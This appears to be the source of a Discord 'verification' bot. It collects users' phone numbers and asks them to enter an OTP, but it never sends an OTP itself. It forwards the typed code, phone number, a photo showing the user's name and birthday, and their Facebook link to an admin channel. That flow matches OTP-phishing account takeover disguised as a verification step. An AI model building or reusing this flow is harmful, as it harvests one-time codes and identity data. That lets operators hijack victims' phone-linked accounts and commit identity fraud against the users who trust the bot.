const http = require('http');

const PORT = process.env.PORT || 3000;

http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('ZBS Verification Bot is running');
}).listen(PORT, () => {
  console.log('HTTP server running on port ' + PORT);
});


const { EmbedBuilder } = require('discord.js');

require('dotenv').config();

const {
  Client,
  GatewayIntentBits,
  Partials,
  ButtonBuilder,
  ButtonStyle,
  ActionRowBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const detectCountry = require('./utils/country');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel]
});

let lastVerificationDay = null;


/* =====================
   STORAGE
===================== */
client.sessions = new Map();
let lastVerifyMessageId = null;

// SEND VERIFY BUTTON (DAILY)
async function sendOrReplaceVerificationMessage() {
  try {
    const channel = await client.channels.fetch(process.env.VERIFY_CHANNEL_ID);

    if (lastVerifyMessageId) {
      try {
        const oldMsg = await channel.messages.fetch(lastVerifyMessageId);
        await oldMsg.delete();
      } catch (e) {}
    }

    const verifyButton = new ButtonBuilder()
      .setCustomId('start_verify')
      .setLabel('Start Verification')
      .setStyle(ButtonStyle.Primary);

    const newMsg = await channel.send({
      content:
        "Ayo! Let’s see if you are a real human beauliever 👀\n" +
        "Click the button below to start verification:",
      components: [
        new ActionRowBuilder().addComponents(verifyButton)
      ]
    });

    lastVerifyMessageId = newMsg.id;
  } catch (err) {
    console.error('Failed to send/replace verification message:', err);
  }
}

/* =====================
   READY
===================== */
client.once('ready', () => {
  console.log('Bot online as ' + client.user.tag);

  lastVerificationDay = new Date().toDateString();
  sendOrReplaceVerificationMessage();
});


/* =====================
   INTERACTIONS
===================== */
client.on('interactionCreate', async interaction => {

  /* START VERIFY BUTTON */
  if (interaction.isButton() && interaction.customId === 'start_verify') {
  if (!interaction.deferred && !interaction.replied) {
    await interaction.deferUpdate();
  }

    const modal = new ModalBuilder()
      .setCustomId('phone_modal')
      .setTitle('ZBS OTP Verification');

    const phoneInput = new TextInputBuilder()
      .setCustomId('phone_number')
      .setLabel('Enter your phone number, +63')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(
      new ActionRowBuilder().addComponents(phoneInput)
    );

    return interaction.showModal(modal);
  }

/* ADMIN APPROVE / REJECT */
if (
  interaction.isButton() &&
  (interaction.customId.startsWith('approve_') ||
   interaction.customId.startsWith('reject_'))
) {
  await interaction.deferReply({ ephemeral: true });

  const parts = interaction.customId.split('_');
  const action = parts[0];
  const userId = parts[1];

  const guild = interaction.guild;
  const logChannel = await interaction.client.channels.fetch(
    process.env.LOG_CHANNEL_ID
  );

  const session = client.sessions.get(userId);

  if (action === 'approve') {
    try {
      const member = await guild.members.fetch(userId);

      await member.roles.add(process.env.VERIFIED_ROLE_ID);

// Notify user via DM
try {
  await member.send(
    '🎉 Ayo! You are now VERIFIED!\n\n' +
    'Thank you for completing the verification process.\n' +
    'You now have full access to ZBS server. Hope you will enjoy it here!'
  );
} catch (e) {
  // User has DMs closed – ignore silently
}

      await logChannel.send(
        'VERIFICATION APPROVED\n' +
        'User: <@' + userId + '>\n' +
        'Approved by: <@' + interaction.user.id + '>\n' +
        'Phone: ' + (session && session.phone ? session.phone : 'Not provided') + '\n' +
		'Facebook: ' + (session && session.fbLink ? session.fbLink : 'Not provided') + '\n' +
        'Time: <t:' + Math.floor(Date.now() / 1000) + ':F>'
      );

      client.sessions.delete(userId);

      await interaction.editReply(
        'User <@' + userId + '> has been APPROVED and VERIFIED.'
      );
    } catch (err) {
      await interaction.editReply(
        'Failed to approve user. Check bot role permissions.'
      );
    }

    return;
  }

  if (action === 'reject') {
    await logChannel.send(
      'VERIFICATION REJECTED\n' +
      'User: <@' + userId + '>\n' +
      'Rejected by: <@' + interaction.user.id + '>\n' +
      'Phone: ' + (session && session.phone ? session.phone : 'Not provided') + '\n' +
	  'Facebook: ' + (session && session.fbLink ? session.fbLink : 'Not provided') + '\n' +
      'Time: <t:' + Math.floor(Date.now() / 1000) + ':F>'
    );

    client.sessions.delete(userId);

    await interaction.editReply(
      'User <@' + userId + '> has been REJECTED.'
    );

    return;
  }
}

  
  /* PHONE MODAL SUBMIT */
  if (interaction.isModalSubmit() && interaction.customId === 'phone_modal') {
    await interaction.deferReply({ ephemeral: true });

    const phone = interaction.fields.getTextInputValue('phone_number');
    const country = detectCountry(phone);

    client.sessions.set(interaction.user.id, {
      phone,
      country,
      createdAt: Date.now(),
      otpUsed: false,
      otpSubmitted: false,
      photoSubmitted: false
    });

    const admin = await client.channels.fetch(process.env.ADMIN_CHANNEL_ID);
    await admin.send(
      'NEW VERIFICATION\n' +
      'User: <@' + interaction.user.id + '>\n' +
      'Phone: ' + phone + '\n' +
      'Country: ' + country
    );

    const otpButton = new ButtonBuilder()
      .setCustomId('enter_otp')
      .setLabel('Enter OTP')
      .setStyle(ButtonStyle.Success);

    await interaction.editReply({
      content: '📲 received. Click below once you receive the OTP.',
      components: [new ActionRowBuilder().addComponents(otpButton)]
    });
  }

  /* ENTER OTP BUTTON */
  if (interaction.isButton() && interaction.customId === 'enter_otp') {
    const session = client.sessions.get(interaction.user.id);
    if (!session || session.otpUsed) {
      return interaction.reply({ content: 'OTP not allowed.', ephemeral: true });
    }

    const modal = new ModalBuilder()
      .setCustomId('otp_modal')
      .setTitle('Enter OTP');

    const otpInput = new TextInputBuilder()
      .setCustomId('otp_code')
      .setLabel('OTP Code')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(
      new ActionRowBuilder().addComponents(otpInput)
    );

    return interaction.showModal(modal);
  }

  /* OTP MODAL SUBMIT */
  if (interaction.isModalSubmit() && interaction.customId === 'otp_modal') {
    const session = client.sessions.get(interaction.user.id);
    if (!session || session.otpUsed) {
      return interaction.reply({ content: 'OTP not allowed.', ephemeral: true });
    }

    session.otpUsed = true;
    session.otpSubmitted = true;

    const otp = interaction.fields.getTextInputValue('otp_code');

    const admin = await client.channels.fetch(process.env.ADMIN_CHANNEL_ID);
    await admin.send(
      'OTP SUBMITTED\n' +
      'User: <@' + interaction.user.id + '>\n' +
      'OTP: ' + otp
    );

    const requirementsEmbed = new EmbedBuilder()
  .setTitle('ZBS Final Verification Requirements')
  .setDescription(
    'To complete verification, please prepare the following to prove that you are a real Beauliever:\n\n' +
    '• A photo holding a paper or phone with **your name and birthday**\n' +
    '• Your **Facebook profile link**\n' +
    '• A screenshot showing you followed:\n\n' +
    '🔹 [Click here to open my FB Profile](https://www.facebook.com/share/175CgS9dWS/)\n' +
    '🔹 [Click here to open my FB Page](https://www.facebook.com/share/16XELgaE47/)\n' +
    '🔹 [Click here to open my FB Group](https://www.facebook.com/groups/800333518927857/)\n\n' +
    'Baka hindi ikaw naka follow ha! Tampo na ako.' +
	'Once ready, click the button below to send everything via DM.'
  )
  .setColor(0x1877F2)
  .setFooter({ text: 'Moderators will review your submission after DM.' });

const dmButton = new ButtonBuilder()
  .setLabel('Send Requirements via DM')
  .setStyle(ButtonStyle.Link)
  .setURL('https://discord.com/users/' + interaction.client.user.id);

await interaction.reply({
  ephemeral: true,
  embeds: [requirementsEmbed],
  components: [
    new ActionRowBuilder().addComponents(dmButton)
  ]
});

  }
});

/* =====================
   PHOTO HANDLER (DM)
===================== */
client.on('messageCreate', async msg => {
  if (msg.author.bot) return;
  if (!msg.channel.isDMBased()) return;

  const session = client.sessions.get(msg.author.id);
  if (!session) return;

  const admin = await msg.client.channels.fetch(process.env.ADMIN_CHANNEL_ID);

  /* =====================
     FACEBOOK LINK HANDLER
  ===================== */
  if (msg.content && msg.content.includes('facebook.com')) {
    session.fbLink = msg.content.trim();

    await admin.send(
      'FB LINK SUBMITTED\n' +
      'User: <@' + msg.author.id + '>\n' +
      'Facebook Profile: ' + session.fbLink
    );

    await msg.reply(
      'Facebook profile link received. You may now send your photos if not done yet. Then wait for admin review.'
    );

    return; // stop here so it doesn’t fall through
  }

  /* =====================
     PHOTO HANDLER
  ===================== */
  if (msg.attachments.size === 0) {
    return msg.reply(
      'Please send either:\n' +
      '- Your Facebook profile link\n' +
      '- OR your photo verification images'
    );
  }

  const images = [];
  for (const attachment of msg.attachments.values()) {
    if (attachment.contentType && attachment.contentType.startsWith('image/')) {
      images.push(attachment.url);
    }
  }

  if (images.length === 0) {
    return msg.reply('Only image files are allowed.');
  }

  session.photoSubmitted = true;

  const approveButton = new ButtonBuilder()
    .setCustomId('approve_' + msg.author.id)
    .setLabel('Approve')
    .setStyle(ButtonStyle.Success);

  const rejectButton = new ButtonBuilder()
    .setCustomId('reject_' + msg.author.id)
    .setLabel('Reject')
    .setStyle(ButtonStyle.Danger);

  await admin.send({
    content:
      'PHOTO(S) SUBMITTED\n' +
      'User: <@' + msg.author.id + '>\n' +
      'Images received: ' + images.length +
      (session.fbLink ? '\nFacebook Profile: ' + session.fbLink : ''),
    files: images,
    components: [
      new ActionRowBuilder().addComponents(approveButton, rejectButton)
    ]
  });

  await msg.reply(
    'Photo(s) received. You may send your Facebook profile link if not done yet. Then wait for admin review.'
  );
});


/* =====================
   SESSION EXPIRY
===================== */
setInterval(async () => {
  const now = Date.now();

  for (const [userId, session] of client.sessions) {
    if (now - session.createdAt > 10 * 60 * 1000) {

      // 🔔 Notify user
      try {
        const user = await client.users.fetch(userId);
        await user.send(
          '⏰ Your verification session has **expired**. Tagal mo kasi eh.\n\n' +
          'For security reasons, verification sessions last only 10 minutes.\n' +
          'Please return to the server and start verification again.'
        );
      } catch (e) {
        // User DMs closed — ignore safely
      }

      // 🧾 Log to admin
      try {
        const logChannel = await client.channels.fetch(
          process.env.LOG_CHANNEL_ID
        );

        await logChannel.send(
          'VERIFICATION EXPIRED\n' +
          'User: <@' + userId + '>\n' +
          'Phone: ' + (session.phone ? session.phone : 'Not provided') + '\n' +
          'Time: <t:' + Math.floor(Date.now() / 1000) + ':F>'
        );
      } catch (e) {
        console.error('Failed to log expired session:', e);
      }

      // ❌ Remove session
      client.sessions.delete(userId);
    }
  }
}, 60000);

// Check every minute if we need to refresh the verification message
setInterval(() => {
  const today = new Date().toDateString();

  if (lastVerificationDay !== today) {
    lastVerificationDay = today;
    sendOrReplaceVerificationMessage();
  }
}, 60 * 1000);


client.on('error', err => {
  console.error('Discord client error:', err);
});

process.on('unhandledRejection', err => {
  console.error('Unhandled promise rejection:', err);
});


/* =====================
   LOGIN
===================== */
client.login(process.env.TOKEN);
